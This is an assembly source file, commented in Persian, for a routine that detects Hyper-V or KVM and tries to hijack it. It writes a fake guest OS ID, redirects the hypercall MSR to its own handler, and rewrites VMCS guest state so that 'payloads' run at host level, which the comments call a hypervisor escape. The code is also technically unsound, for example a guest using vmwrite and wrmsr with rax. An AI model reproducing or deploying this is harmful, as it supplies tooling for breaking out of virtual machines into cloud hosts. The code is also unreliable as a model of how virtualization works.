section .text
global kvm_hypercall_redirect

%include "hypervisor_int.inc"

kvm_hypercall_redirect:
    ; تشخیص نوع هایپروایزر
    mov eax, HYPERV_CPUID_INTERFACE
    cpuid
    cmp ebx, HYPERV_SIGNATURE
    je .hyperv_redirect

    mov eax, KVM_CPUID_SIGNATURE
    cpuid
    cmp ebx, KVM_SIGNATURE
    je .kvm_redirect

    ret

.hyperv_redirect:
    ; دستکاری MSR هایپروایزر
    mov ecx, HV_X64_MSR_GUEST_OS_ID
    xor edx, edx
    mov eax, 0xDEADBEEF          ; شناسه جعلی
    wrmsr

    ; تغییر مسیر تماس‌های ابری
    mov ecx, HV_X64_MSR_HYPERCALL
    rdmsr
    mov [orig_hypercall], rax
    mov rax, our_hypercall_handler
    wrmsr
    ret

.kvm_redirect:
    ; دستکاری ساختار KVM VMCS
    vmwrite GUEST_RIP, our_vmexit_handler
    vmwrite GUEST_CS_SELECTOR, 0x10
    vmwrite GUEST_CS_LIMIT, 0xFFFFFFFF
    vmwrite GUEST_CS_ACCESS_RIGHTS, 0xC09B
    ret

our_hypercall_handler:
    ; اجرای پیلود در سطح میزبان
    mov rax, [payloads + HYPERVISOR_ESCAPE]
    jmp rax

our_vmexit_handler:
    ; اجرای کد در سطح VMM
    mov rax, [payloads + VMM_EXECUTION]
    call rax
    vmresume
    